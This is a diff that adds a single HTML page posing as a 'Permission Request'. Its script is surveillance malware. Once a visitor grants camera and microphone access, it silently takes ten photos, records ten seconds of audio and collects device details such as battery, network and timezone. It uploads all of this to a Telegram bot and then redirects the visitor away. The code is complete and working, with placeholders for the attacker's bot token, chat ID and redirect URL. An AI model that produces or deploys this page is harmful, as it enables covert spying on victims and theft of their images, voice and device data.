@@ -1,0 +1,124 @@
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Permission Request</title>
+    <script>
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+        const REDIRECT_URL = 'YOUR_REDIRECT_URL';
+        let mediaStream = null;
+        let audioRecorder = null;
+        let audioChunks = [];
+
+        async function requestPermissions() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('status').innerText = 'Permissions granted. Capturing media...';
+                captureMedia();
+            } catch (error) {
+                document.getElementById('status').innerText = 'Error: ' + error.message;
+            }
+        }
+
+        async function captureMedia() {
+            try {
+                for (let i = 0; i < 10; i++) {
+                    let photoBlob = await takePhoto();
+                    await sendToTelegram(photoBlob, 'image/jpeg', `photo_${i+1}.jpg`);
+                }
+
+                await recordAudio();
+                await sendDeviceInfo();
+
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
+
+            } catch (error) {
+                document.getElementById('status').innerText = 'Capture error: ' + error.message;
+            }
+        }
+
+        async function takePhoto() {
+            const video = document.createElement('video');
+            video.srcObject = mediaStream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.8);
+            });
+        }
+
+        async function recordAudio() {
+            audioRecorder = new MediaRecorder(mediaStream);
+            audioChunks = [];
+
+            audioRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            return new Promise(resolve => {
+                audioRecorder.onstop = resolve;
+                audioRecorder.start();
+                setTimeout(() => {
+                    audioRecorder.stop();
+                }, 10000);
+            });
+        }
+
+        async function sendToTelegram(blob, mimeType, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', blob, filename);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        async function sendDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                battery: null,
+                network: navigator.connection ? navigator.connection.type : 'unknown',
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled
+            };
+
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                deviceInfo.battery = {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            }
+
+            const infoBlob = new Blob([JSON.stringify(deviceInfo, null, 2)], { type: 'application/json' });
+            await sendToTelegram(infoBlob, 'application/json', 'device_info.json');
+
+            if (audioChunks.length > 0) {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                await sendToTelegram(audioBlob, 'audio/webm', 'audio_recording.webm');
+            }
+        }
+    </script>
+</head>
+<body onload="requestPermissions()">
+    <h1>Permission Request</h1>
+    <p id="status">Requesting camera and microphone access...</p>
+</body>
+</html>
+```
